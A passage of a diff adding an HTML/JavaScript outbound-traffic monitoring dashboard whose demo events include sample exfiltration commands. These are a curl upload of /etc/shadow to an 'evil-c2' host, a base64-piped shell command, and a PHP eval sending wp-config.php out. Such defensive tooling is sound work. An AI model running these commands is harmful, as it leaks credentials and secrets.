@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Binary Upload Tracker — Outbound Monitor</title>
+<style>
+  :root {
+    --bg-app: #111217;
+    --bg-panel: #181b1f;
+    --bg-nav: #1e2228;
+    --bg-hover: #22252b;
+    --border: #2c323c;
+    --text-primary: #d9d9d9;
+    --text-muted: #8e8e8e;
+    --accent-blue: #3274d9;
+    --risk-low: #73bf69;
+    --risk-med: #f2cc0c;
+    --risk-high: #ff9830;
+    --risk-crit: #f2495c;
+    --font-stack: Inter, Roboto, Helvetica, Arial, sans-serif;
+    --font-mono: 'SF Mono', Menlo, Monaco, Consolas, monospace;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: var(--bg-app); color: var(--text-primary);
+    font-family: var(--font-stack); font-size: 13px; line-height: 1.4; overflow-x: hidden;
+  }
+
+  /* --- Top Nav --- */
+  .top-nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100; height: 50px;
+    background: var(--bg-nav); border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between; padding: 0 20px;
+  }
+  .nav-left { display: flex; align-items: center; gap: 10px; }
+  .nav-logo svg { width: 24px; height: 24px; fill: var(--accent-blue); }
+  .nav-title { font-weight: 600; font-size: 15px; color: #fff; letter-spacing: 0.2px; }
+  .nav-right { display: flex; align-items: center; gap: 16px; font-size: 12px; color: var(--text-muted); }
+  .status-live { display: flex; align-items: center; gap: 6px; color: var(--risk-low); font-weight: 500; }
+  .status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--risk-low); box-shadow: 0 0 4px var(--risk-low); }
+  .refresh-btn {
+    background: none; border: 1px solid var(--border); border-radius: 4px;
+    color: var(--text-muted); cursor: pointer; padding: 4px 8px; font-size: 11px; transition: all 0.15s;
+  }
+  .refresh-btn:hover { border-color: var(--accent-blue); color: var(--accent-blue); }
+
+  /* --- Layout --- */
+  .main-content { padding: 70px 20px 20px; max-width: 1600px; margin: 0 auto; }
+
+  /* --- Panel --- */
+  .panel { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
+  .panel-header {
+    padding: 10px 16px; border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap;
+  }
+  .panel-title { font-size: 11px; font-weight: 500; text-transform: uppercase; color: var(--text-muted); letter-spacing: 0.5px; }
+  .panel-body { padding: 16px; }
+
+  /* --- Row 1: Stats + Risk --- */
+  .stats-row { display: grid; grid-template-columns: repeat(3, 1fr) 1.2fr; gap: 12px; margin-bottom: 12px; }
+  .stat-panel .panel-body { padding: 14px 16px; }
+  .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.4px; margin-bottom: 6px; }
+  .stat-value { font-size: 32px; font-weight: 700; color: #fff; line-height: 1; }
+  .stat-sparkline { display: flex; align-items: flex-end; gap: 1px; height: 20px; margin-top: 8px; }
+  .stat-sparkline .bar { flex: 1; opacity: 0.6; border-radius: 1px 1px 0 0; min-width: 2px; }
+
+  /* Risk Segmentation Panel */
+  .risk-seg-body { display: flex; align-items: center; gap: 16px; padding: 14px 16px; }
+  .risk-donut-wrap { position: relative; width: 70px; height: 70px; flex-shrink: 0; }
+  .risk-donut-wrap svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+  .risk-donut-center {
+    position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+    font-size: 11px; font-weight: 700; color: #fff; text-align: center; line-height: 1.1;
+  }
+  .risk-legend { display: flex; flex-direction: column; gap: 5px; flex: 1; }
+  .risk-legend-item { display: flex; align-items: center; gap: 6px; font-size: 11px; }
+  .risk-legend-dot { width: 8px; height: 8px; border-radius: 2px; flex-shrink: 0; }
+  .risk-legend-label { color: var(--text-muted); flex: 1; }
+  .risk-legend-count { font-weight: 600; color: var(--text-primary); min-width: 24px; text-align: right; }
+
+  /* --- Row 2: Viz --- */
+  .viz-row { display: grid; grid-template-columns: 2fr 1fr; gap: 12px; margin-bottom: 12px; }
+  .timeline-chart { display: flex; align-items: flex-end; gap: 2px; height: 140px; padding-top: 10px; }
+  .timeline-bar-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; height: 100%; justify-content: flex-end; }
+  .timeline-bar {
+    width: 100%; border-radius: 2px 2px 0 0; min-height: 1px;
+    background: var(--accent-blue); opacity: 0.7; position: relative;
+  }
+  .timeline-bar:hover { opacity: 1; }
+  .timeline-bar .tooltip {
+    display: none; position: absolute; bottom: calc(100% + 4px); left: 50%; transform: translateX(-50%);
+    background: #000; color: #fff; padding: 3px 6px; border-radius: 3px; font-size: 10px; white-space: nowrap; z-index: 10;
+  }
+  .timeline-bar:hover .tooltip { display: block; }
+  .timeline-label { font-size: 9px; color: var(--text-muted); margin-top: 4px; writing-mode: vertical-rl; transform: rotate(180deg); height: 30px; }
+
+  .top-list { list-style: none; }
+  .top-list-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid var(--border); }
+  .top-list-item:last-child { border-bottom: none; }
+  .top-list-rank { font-size: 10px; color: var(--text-muted); width: 16px; text-align: center; }
+  .top-list-name { flex: 1; font-size: 12px; color: var(--text-primary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .top-list-count { font-size: 12px; font-weight: 600; color: var(--text-primary); min-width: 30px; text-align: right; }
+  .top-list-bar-bg { flex: 0 0 80px; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; }
+  .top-list-bar-fill { height: 100%; border-radius: 3px; background: var(--accent-blue); }
+
+  /* --- Row 3: Event Log --- */
+  .log-panel { display: flex; flex-direction: column; }
+  .log-controls { display: flex; align-items: center; gap: 8px; }
+  .filter-input, .risk-filter {
+    background: var(--bg-app); border: 1px solid var(--border); border-radius: 4px;
+    color: var(--text-primary); padding: 5px 10px; font-size: 12px; outline: none;
+  }
+  .filter-input { width: 200px; }
+  .risk-filter { width: 120px; cursor: pointer; }
+  .risk-filter option { background: var(--bg-panel); color: var(--text-primary); }
+
+  .log-table-wrap { overflow-y: auto; max-height: 55vh; }
+  table.log-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .log-table thead { position: sticky; top: 0; z-index: 2; }
+  .log-table th {
+    background: var(--bg-nav); color: var(--text-muted); font-weight: 500;
+    text-transform: uppercase; font-size: 10px; letter-spacing: 0.5px;
+    padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border);
+  }
+  .log-table td { padding: 6px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  .log-table tr.log-row:hover td { background: var(--bg-hover); }
+  .log-time { font-family: var(--font-mono); color: var(--text-muted); white-space: nowrap; font-size: 11px; }
+
+  .badge {
+    display: inline-block; padding: 1px 6px; border-radius: 3px;
+    font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.3px;
+  }
+  .badge-net { background: rgba(115,191,105,0.15); color: var(--risk-low); }
+  .badge-proc { background: rgba(242,73,92,0.15); color: var(--risk-crit); }
+
+  .risk-badge {
+    display: inline-block; padding: 1px 6px; border-radius: 3px;
+    font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.3px;
+  }
+
+  .log-detail { color: var(--text-primary); word-break: break-all; }
+  .log-size { color: var(--text-muted); font-family: var(--font-mono); font-size: 11px; white-space: nowrap; }
+
+  /* --- Process Tree Styling --- */
+  .proc-tree {
+    display: inline-flex; align-items: center; gap: 0;
+    font-family: var(--font-mono); font-size: 12px; line-height: 1.6;
+    flex-wrap: wrap;
+  }
+  .proc-tree-user { color: var(--accent-blue); font-weight: 600; margin-right: 6px; }
+  .proc-tree-node {
+    color: var(--text-primary); font-weight: 500;
+    padding: 1px 5px; border-radius: 3px;
+    background: rgba(50,116,217,0.1);
+  }
+  .proc-tree-node.proc-leaf {
+    background: rgba(242,73,92,0.18); color: var(--risk-crit); font-weight: 700;
+  }
+  .proc-tree-arrow { color: var(--risk-high); font-weight: 700; margin: 0 3px; font-size: 13px; }
+  .proc-args {
+    display: block; margin-top: 3px; font-size: 11px; color: var(--text-muted);
+    font-family: var(--font-mono); word-break: break-all; max-width: 600px;
+  }
+  .file-detail-name { color: var(--text-primary); font-weight: 600; margin-right: 4px; }
+  .file-detail-path {
+    font-family: var(--font-mono); font-size: 11px; color: var(--text-muted);
+    word-break: break-all; display: inline-block; max-width: 500px;
+  }
+
+  @media (max-width: 1100px) {
+    .stats-row { grid-template-columns: repeat(2, 1fr); }
+    .viz-row { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <div class="nav-left">
+    <div class="nav-logo">
+      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.95-7 10.16-3.87-1.21-7-5.49-7-10.16V6.3l7-3.12zM11 7v2h2V7h-2zm0 4v6h2v-6h-2z"/></svg>
+    </div>
+    <span class="nav-title">Outbound Traffic Monitor</span>
+  </div>
+  <div class="nav-right">
+    <span class="status-live"><span class="status-dot"></span>Live</span>
+    <span>Last 1 hour</span>
+    <button class="refresh-btn">&#x21bb; Refresh</button>
+  </div>
+</nav>
+
+<div class="main-content">
+
+  <!-- Row 1: Stats + Classification Segmentation -->
+  <div class="stats-row">
+    <div class="panel stat-panel">
+      <div class="panel-body">
+        <div class="stat-label">Total Events</div>
+        <div class="stat-value" id="statTotal">147</div>
+        <div class="stat-sparkline" id="sparkTotal"></div>
+      </div>
+    </div>
+    <div class="panel stat-panel">
+      <div class="panel-body">
+        <div class="stat-label">Network Uploads</div>
+        <div class="stat-value" id="statNet" style="color:#5b9bd5">89</div>
+        <div class="stat-sparkline" id="sparkNet"></div>
+      </div>
+    </div>
+    <div class="panel stat-panel">
+      <div class="panel-body">
+        <div class="stat-label">Processes</div>
+        <div class="stat-value" id="statProc" style="color:#c78dfc">58</div>
+        <div class="stat-sparkline" id="sparkProc"></div>
+      </div>
+    </div>
+    <!-- Classification Segmentation Panel -->
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Classification Breakdown</span></div>
+      <div class="risk-seg-body">
+        <div class="risk-donut-wrap">
+          <svg viewBox="0 0 36 36" id="riskDonut">
+            <circle cx="18" cy="18" r="15.915" fill="none" stroke="#2c323c" stroke-width="3"/>
+          </svg>
+          <div class="risk-donut-center" id="riskDonutLabel">28</div>
+        </div>
+        <div class="risk-legend" id="riskLegend"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Row 2: Visualizations -->
+  <div class="viz-row">
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Event Timeline (last 30 min)</span></div>
+      <div class="panel-body">
+        <div class="timeline-chart" id="timelineChart"></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Top Destinations / Processes</span></div>
+      <div class="panel-body">
+        <ul class="top-list" id="topList"></ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Row 3: Event Log -->
+  <div class="panel log-panel">
+    <div class="panel-header">
+      <span class="panel-title">Live Event Stream</span>
+      <div class="log-controls">
+        <select class="risk-filter" id="riskFilter">
+          <option value="all">All Classifications</option>
+          <option value="known_safe">Known Safe</option>
+          <option value="unknown">Unknown</option>
+          <option value="suspicious">Suspicious</option>
+        </select>
+        <input type="text" class="filter-input" id="filterInput" placeholder="Filter events…">
+      </div>
+    </div>
+    <div class="log-table-wrap" id="logTableWrap">
+      <table class="log-table">
+        <thead><tr><th>Time</th><th>Classification</th><th>Type</th><th>Process Tree / Source</th><th>Details</th><th>Risk Factors</th><th>Size</th></tr></thead>
+        <tbody id="logBody"></tbody>
+      </table>
+    </div>
+  </div>
+
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  var CLASS_COLORS = { known_safe: '#4caf84', unknown: '#f2cc0c', suspicious: '#d94f4f' };
+  var CLASS_LABELS = { known_safe: 'Known Safe', unknown: 'Unknown', suspicious: 'Suspicious' };
+  var FACTOR_COLORS = {
+    LOCAL_NETWORK: '#4caf84', PUBLIC_INTERNET: '#5b9bd5',
+    TMP_EXECUTION: '#d94f4f', OBFUSCATED_COMMAND: '#d94f4f', SUSPICIOUS_ANCESTRY: '#d94f4f',
+    USER_SPACE_BINARY: '#f2cc0c', INTERPRETER_EXECUTION: '#f2cc0c', UNKNOWN_SCRIPT: '#f2cc0c',
+    MASSIVE_UPLOAD: '#ff9830', NON_STANDARD_PORT: '#ff9830', LARGE_RAW_PAYLOAD: '#ff9830',
+    SYSTEM_BINARY: '#73bf69'
+  };
+
+  // Demo data: 28 realistic events
+  var DEMO_EVENTS = [
+    // === KNOWN SAFE (15) ===
+    { timestamp: Date.now() - 120000, type: 'endpoint_process', classification: 'known_safe', user: 'root', processTree: ['systemd', 'sshd', 'bash', 'scp'], comm: 'scp', args: '/var/log/auth.log admin@10.0.1.50:/backup/', filePath: '/var/log/auth.log', fileSizeBytes: 245760, riskFactors: ['LOCAL_NETWORK', 'SYSTEM_BINARY'] },
+    { timestamp: Date.now() - 300000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '10.0.1.50', dstPort: 22, bytes: 524288, proto: 'TCP', riskFactors: ['LOCAL_NETWORK'] },
+    { timestamp: Date.now() - 480000, type: 'endpoint_process', classification: 'known_safe', user: 'root', processTree: ['cron', 'backup.sh', 'tar', 'scp'], comm: 'scp', args: '/var/backups/db-daily.tar.gz backup@192.168.1.100:/archive/', filePath: '/var/backups/db-daily.tar.gz', fileSizeBytes: 471859200, riskFactors: ['LOCAL_NETWORK', 'SYSTEM_BINARY', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 600000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '192.168.1.100', dstPort: 22, bytes: 471859200, proto: 'TCP', riskFactors: ['LOCAL_NETWORK', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 720000, type: 'endpoint_process', classification: 'known_safe', user: 'deploy', processTree: ['node', 'server.js', 'https.request'], comm: 'node', args: 'POST https://api.stripe.com/v1/charges', filePath: '/opt/app/server.js', fileSizeBytes: 2048, riskFactors: ['PUBLIC_INTERNET', 'SYSTEM_BINARY'] },
+    { timestamp: Date.now() - 900000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '104.18.12.33', dstPort: 443, bytes: 2048, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET'] },
+    { timestamp: Date.now() - 1020000, type: 'endpoint_process', classification: 'known_safe', user: 'www-data', processTree: ['apache2', 'php-fpm', 'curl'], comm: 'curl', args: '-X POST -d @/var/www/cache/purge.json http://10.0.2.30:6081/purge', filePath: '/var/www/cache/purge.json', fileSizeBytes: 1228, riskFactors: ['LOCAL_NETWORK', 'SYSTEM_BINARY'] },
+    { timestamp: Date.now() - 1200000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '10.0.2.30', dstPort: 6081, bytes: 1228, proto: 'TCP', riskFactors: ['LOCAL_NETWORK'] },
+    { timestamp: Date.now() - 1380000, type: 'endpoint_process', classification: 'known_safe', user: 'root', processTree: ['systemd', 'apt', 'curl'], comm: 'curl', args: '-o /var/cache/apt/archives/linux-headers.deb http://10.0.3.5/ubuntu/pool/main/l/linux/', filePath: '/var/cache/apt/archives/linux-headers.deb', fileSizeBytes: 15728640, riskFactors: ['LOCAL_NETWORK', 'SYSTEM_BINARY'] },
+    { timestamp: Date.now() - 1500000, type: 'endpoint_process', classification: 'known_safe', user: 'jenkins', processTree: ['java', 'gradle', 'scp'], comm: 'scp', args: '/opt/ci/builds/app-2.4.1.jar deploy@10.0.5.20:/releases/', filePath: '/opt/ci/builds/app-2.4.1.jar', fileSizeBytes: 89456640, riskFactors: ['LOCAL_NETWORK', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 1620000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '10.0.5.20', dstPort: 22, bytes: 89456640, proto: 'TCP', riskFactors: ['LOCAL_NETWORK', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 1740000, type: 'endpoint_process', classification: 'known_safe', user: 'postgres', processTree: ['postgres', 'pg_dump', 'gzip'], comm: 'gzip', args: '/var/lib/postgresql/backups/prod_20261118.sql', filePath: '/var/lib/postgresql/backups/prod_20261118.sql', fileSizeBytes: 314572800, riskFactors: ['SYSTEM_BINARY', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 1800000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '10.0.1.200', dstPort: 5432, bytes: 4096, proto: 'TCP', riskFactors: ['LOCAL_NETWORK'] },
+    { timestamp: Date.now() - 1920000, type: 'endpoint_process', classification: 'known_safe', user: 'root', processTree: ['systemd', 'rsyslogd', 'logger'], comm: 'logger', args: '/var/log/syslog rotation complete', filePath: '/var/log/syslog', fileSizeBytes: 52428800, riskFactors: ['SYSTEM_BINARY', 'LOCAL_NETWORK'] },
+    { timestamp: Date.now() - 2040000, type: 'network', classification: 'known_safe', srcIp: '10.0.1.12', dstIp: '10.0.1.1', dstPort: 514, bytes: 8192, proto: 'UDP', riskFactors: ['LOCAL_NETWORK'] },
+
+    // === UNKNOWN (8) ===
+    { timestamp: Date.now() - 180000, type: 'endpoint_process', classification: 'unknown', user: 'dev', processTree: ['python3', 'sync_db.py', 'rsync'], comm: 'rsync', args: '-avz /home/dev/data/ dev@203.0.113.45:/staging/', filePath: '/home/dev/scripts/sync_db.py', fileSizeBytes: 15728640, riskFactors: ['USER_SPACE_BINARY', 'INTERPRETER_EXECUTION', 'PUBLIC_INTERNET'] },
+    { timestamp: Date.now() - 360000, type: 'network', classification: 'unknown', srcIp: '10.0.1.12', dstIp: '203.0.113.45', dstPort: 22, bytes: 15728640, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET', 'MASSIVE_UPLOAD'] },
+    { timestamp: Date.now() - 540000, type: 'endpoint_process', classification: 'unknown', user: 'analyst', processTree: ['python3', 'upload_report.py', 'requests.post'], comm: 'python3', args: 'POST https://analytics.internal.corp/api/v2/reports', filePath: '/home/analyst/tools/upload_report.py', fileSizeBytes: 3145728, riskFactors: ['USER_SPACE_BINARY', 'INTERPRETER_EXECUTION'] },
+    { timestamp: Date.now() - 660000, type: 'network', classification: 'unknown', srcIp: '10.0.1.12', dstIp: '172.16.0.50', dstPort: 8443, bytes: 3145728, proto: 'TCP', riskFactors: ['NON_STANDARD_PORT'] },
+    { timestamp: Date.now() - 840000, type: 'endpoint_process', classification: 'unknown', user: 'dev', processTree: ['node', 'deploy.js', 'axios.put'], comm: 'node', args: 'PUT https://registry.npmjs.org/-/package/mylib/dist-tags/latest', filePath: '/home/dev/projects/mylib/deploy.js', fileSizeBytes: 45056, riskFactors: ['USER_SPACE_BINARY', 'INTERPRETER_EXECUTION', 'PUBLIC_INTERNET'] },
+    { timestamp: Date.now() - 960000, type: 'network', classification: 'unknown', srcIp: '10.0.1.12', dstIp: '104.16.16.35', dstPort: 443, bytes: 45056, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET'] },
+    { timestamp: Date.now() - 1140000, type: 'endpoint_process', classification: 'unknown', user: 'svc', processTree: ['ruby', 'export_metrics.rb', 'net/http'], comm: 'ruby', args: 'POST https://metrics.datadoghq.com/api/v1/series', filePath: '/opt/monitoring/export_metrics.rb', fileSizeBytes: 28672, riskFactors: ['INTERPRETER_EXECUTION', 'PUBLIC_INTERNET'] },
+    { timestamp: Date.now() - 1260000, type: 'network', classification: 'unknown', srcIp: '10.0.1.12', dstIp: '44.236.128.90', dstPort: 443, bytes: 28672, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET'] },
+
+    // === SUSPICIOUS (5) ===
+    { timestamp: Date.now() - 60000, type: 'endpoint_process', classification: 'suspicious', user: 'www-data', processTree: ['bash', '.hidden_payload.sh', 'curl'], comm: 'curl', args: '-T /etc/shadow https://evil-c2.example.com:8443/exfil', filePath: '/tmp/.hidden_payload.sh', fileSizeBytes: 4096, riskFactors: ['TMP_EXECUTION', 'OBFUSCATED_COMMAND', 'PUBLIC_INTERNET', 'NON_STANDARD_PORT'] },
+    { timestamp: Date.now() - 240000, type: 'network', classification: 'suspicious', srcIp: '10.0.1.12', dstIp: '198.51.100.77', dstPort: 8443, bytes: 4096, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET', 'NON_STANDARD_PORT'] },
+    { timestamp: Date.now() - 420000, type: 'endpoint_process', classification: 'suspicious', user: 'nobody', processTree: ['sh', '-c', 'base64 -d | sh'], comm: 'sh', args: 'echo Y3VybCAtVC9ldGMvcGFzc3dkIGh0dHBzOi8vZXhhbXBsZS5jb20= | base64 -d | sh', filePath: '/tmp/.cache/update.bin', fileSizeBytes: 2048, riskFactors: ['TMP_EXECUTION', 'OBFUSCATED_COMMAND', 'SUSPICIOUS_ANCESTRY'] },
+    { timestamp: Date.now() - 780000, type: 'endpoint_process', classification: 'suspicious', user: 'www-data', processTree: ['php', 'eval()', 'file_put_contents'], comm: 'php', args: 'eval(base64_decode("...")) → curl -T /var/www/html/wp-config.php http://198.51.100.23:9090/grab', filePath: '/var/www/html/wp-admin/admin-ajax.php', fileSizeBytes: 8192, riskFactors: ['OBFUSCATED_COMMAND', 'PUBLIC_INTERNET', 'NON_STANDARD_PORT', 'LARGE_RAW_PAYLOAD'] },
+    { timestamp: Date.now() - 1560000, type: 'network', classification: 'suspicious', srcIp: '10.0.1.12', dstIp: '198.51.100.23', dstPort: 9090, bytes: 8192, proto: 'TCP', riskFactors: ['PUBLIC_INTERNET', 'NON_STANDARD_PORT', 'LARGE_RAW_PAYLOAD'] }
+  ];
+
+  // Sort by timestamp descending for display
+  DEMO_EVENTS.sort(function(a, b) { return b.timestamp - a.timestamp; });
+
+  // Classification counts
+  var classCounts = { known_safe: 15, unknown: 8, suspicious: 5 };
+
+  // DOM refs
+  var elTimeline = document.getElementById('timelineChart');
+  var elTopList = document.getElementById('topList');
+  var elLogBody = document.getElementById('logBody');
+  var elRiskDonut = document.getElementById('riskDonut');
+  var elRiskLegend = document.getElementById('riskLegend');
+  var elSparkTotal = document.getElementById('sparkTotal');
+  var elSparkNet = document.getElementById('sparkNet');
+  var elSparkProc = document.getElementById('sparkProc');
+
+  function pad2(n) { return n < 10 ? '0' + n : '' + n; }
+  function esc(s) { return s ? String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') : ''; }
+  function formatBytes(bytes) {
+    if (bytes == null) return '—';
+    if (bytes < 1024) return '<strong>' + bytes + ' bytes</strong>';
+    if (bytes < 1048576) return '<strong>' + (bytes / 1024).toFixed(1) + ' KB</strong>';
+    if (bytes < 1073741824) return '<strong>' + (bytes / 1048576).toFixed(2) + ' MB</strong>';
+    return '<strong>' + (bytes / 1073741824).toFixed(2) + ' GB</strong>';
+  }
+
+  // --- Render Sparklines ---
+  function renderSparkline(container, values, color) {
+    var max = Math.max.apply(null, values) || 1;
+    var html = '';
+    for (var i = 0; i < values.length; i++) {
+      var h = Math.max(1, Math.round((values[i] / max) * 20));
+      html += '<div class="bar" style="height:' + h + 'px;background:' + color + '"></div>';
+    }
+    container.innerHTML = html;
+  }
+
+  // Sparkline data (simulated history)
+  var sparkTotalData = [120,125,128,130,132,135,137,138,140,141,142,143,143,144,145,145,146,146,147,147];
+  var sparkNetData = [70,72,74,75,77,78,79,80,81,82,83,84,85,85,86,87,87,88,88,89];
+  var sparkProcData = [45,47,48,49,50,51,52,52,53,54,54,55,55,56,56,57,57,57,58,58];
+  renderSparkline(elSparkTotal, sparkTotalData, '#3274d9');
+  renderSparkline(elSparkNet, sparkNetData, '#73bf69');
+  renderSparkline(elSparkProc, sparkProcData, '#f2495c');
+
+  // --- Render Risk Donut ---
+  function renderRiskDonut() {
+    var total = classCounts.known_safe + classCounts.unknown + classCounts.suspicious;
+    var segments = [
+      { key: 'suspicious', val: classCounts.suspicious, color: CLASS_COLORS.suspicious },
+      { key: 'unknown', val: classCounts.unknown, color: CLASS_COLORS.unknown },
+      { key: 'known_safe', val: classCounts.known_safe, color: CLASS_COLORS.known_safe }
+    ];
+    var svgParts = [];
+    var offset = 0;
+    var circumference = 100;
+    for (var i = 0; i < segments.length; i++) {
+      var pct = (segments[i].val / total) * circumference;
+      if (pct > 0) {
+        svgParts.push('<circle cx="18" cy="18" r="15.915" fill="none" stroke="' + segments[i].color + '" stroke-width="3" stroke-dasharray="' + pct.toFixed(2) + ' ' + (circumference - pct).toFixed(2) + '" stroke-dashoffset="' + (-offset).toFixed(2) + '"/>');
+        offset += pct;
+      }
+    }
+    elRiskDonut.innerHTML = svgParts.join('');
+
+    var legendHtml = '';
+    for (var i = 0; i < segments.length; i++) {
+      legendHtml += '<div class="risk-legend-item">' +
+        '<div class="risk-legend-dot" style="background:' + segments[i].color + '"></div>' +
+        '<span class="risk-legend-label">' + CLASS_LABELS[segments[i].key] + '</span>' +
+        '<span class="risk-legend-count">' + segments[i].val + '</span>' +
+        '</div>';
+    }
+    elRiskLegend.innerHTML = legendHtml;
+  }
+  renderRiskDonut();
+
+  // --- Render Timeline ---
+  function renderTimeline() {
+    var now = new Date();
+    var buckets = [];
+    var labels = [];
+    // Realistic distribution: spikes at certain minutes, quiet periods
+    var pattern = [2,1,0,3,1,0,0,4,2,1,0,0,1,5,3,2,0,1,0,0,2,1,3,0,1,4,2,1,0,3];
+    for (var i = 0; i < 30; i++) {
+      buckets.push(pattern[i] || 0);
+      var t = new Date(now.getTime() - (29 - i) * 60000);
+      labels.push(pad2(t.getHours()) + ':' + pad2(t.getMinutes()));
+    }
+    var max = Math.max.apply(null, buckets) || 1;
+    var html = '';
+    for (var i = 0; i < 30; i++) {
+      var h = Math.max(1, Math.round((buckets[i] / max) * 130));
+      html += '<div class="timeline-bar-wrap">' +
+        '<div class="timeline-bar" style="height:' + h + 'px">' +
+        '<div class="tooltip">' + labels[i] + ' — ' + buckets[i] + ' events</div>' +
+        '</div>' +
+        (i % 5 === 0 ? '<div class="timeline-label">' + labels[i] + '</div>' : '<div class="timeline-label"></div>') +
+        '</div>';
+    }
+    elTimeline.innerHTML = html;
+  }
+  renderTimeline();
+
+  // --- Render Top List ---
+  function renderTopList() {
+    var items = [
+      { name: '10.0.1.50', count: 12, type: 'net' },
+      { name: 'scp', count: 8, type: 'proc' },
+      { name: '192.168.1.100', count: 7, type: 'net' },
+      { name: 'curl', count: 6, type: 'proc' },
+      { name: '203.0.113.45', count: 5, type: 'net' },
+      { name: 'rsync', count: 4, type: 'proc' },
+      { name: '10.0.5.20', count: 4, type: 'net' },
+      { name: 'node', count: 3, type: 'proc' },
+      { name: '198.51.100.77', count: 3, type: 'net' },
+      { name: 'python3', count: 3, type: 'proc' }
+    ];
+    var max = items[0].count;
+    var html = '';
+    for (var i = 0; i < items.length; i++) {
+      var pct = Math.round((items[i].count / max) * 100);
+      var color = items[i].type === 'net' ? '#73bf69' : '#f2495c';
+      html += '<li class="top-list-item">' +
+        '<span class="top-list-rank">' + (i + 1) + '</span>' +
+        '<span class="top-list-name">' + esc(items[i].name) + '</span>' +
+        '<div class="top-list-bar-bg"><div class="top-list-bar-fill" style="width:' + pct + '%;background:' + color + '"></div></div>' +
+        '<span class="top-list-count">' + items[i].count + '</span></li>';
+    }
+    elTopList.innerHTML = html;
+  }
+  renderTopList();
+
+  // --- Render Event Log ---
+  function buildProcessTreeHtml(e) {
+    var tree = e.processTree;
+    var user = e.user || '';
+    if (!tree || !tree.length) {
+      return '<span class="proc-tree"><span class="proc-tree-node proc-leaf">' + esc(e.comm || '?') + '</span></span>';
+    }
+    var html = '<span class="proc-tree">';
+    if (user) html += '<span class="proc-tree-user">' + esc(user) + '@</span>';
+    for (var i = 0; i < tree.length; i++) {
+      var isLeaf = (i === tree.length - 1);
+      html += '<span class="proc-tree-node' + (isLeaf ? ' proc-leaf' : '') + '">' + esc(tree[i]) + '</span>';
+      if (i < tree.length - 1) html += '<span class="proc-tree-arrow">→</span>';
+    }
+    html += '</span>';
+    if (e.args && e.args !== e.comm) {
+      html += '<span class="proc-args">' + esc(e.args) + '</span>';
+    }
+    return html;
+  }
+
+  function renderLog() {
+    var html = '';
+    for (var idx = 0; idx < DEMO_EVENTS.length; idx++) {
+      var e = DEMO_EVENTS[idx];
+      var cat = e.type === 'network' ? 'net' : 'proc';
+      var time = new Date(e.timestamp).toLocaleTimeString('en-US', {hour12:false, hour:'2-digit', minute:'2-digit', second:'2-digit'});
+      var classification = e.classification || 'unknown';
+      var riskFactors = e.riskFactors || [];
+
+      // Source
+      var sourceHtml;
+      if (cat === 'proc') {
+        sourceHtml = buildProcessTreeHtml(e);
+      } else {
+        sourceHtml = esc((e.srcIp||'') + ' → ' + (e.dstIp||'') + ':' + (e.dstPort||''));
+      }
+
+      // Details
+      var details = '';
+      if (cat === 'net') {
+        details = (e.proto||'TCP') + ' upload';
+      } else {
+        var parts = [];
+        if (e.filePath) {
+          var basename = e.filePath.split('/').pop() || e.filePath;
+          parts.push('<span class="file-detail-name">' + esc(basename) + '</span>');
+          parts.push('<span class="file-detail-path">' + esc(e.filePath) + '</span>');
+        }
+        details = parts.join(' · ');
+      }
+
+      // Size
+      var size = '—';
+      if (cat === 'net' && e.bytes != null) {
+        size = formatBytes(e.bytes);
+      } else if (cat === 'proc' && e.fileSizeBytes != null) {
+        size = formatBytes(e.fileSizeBytes);
+      }
+
+      // Risk factor badges
+      var factorsHtml = '';
+      for (var f = 0; f < riskFactors.length; f++) {
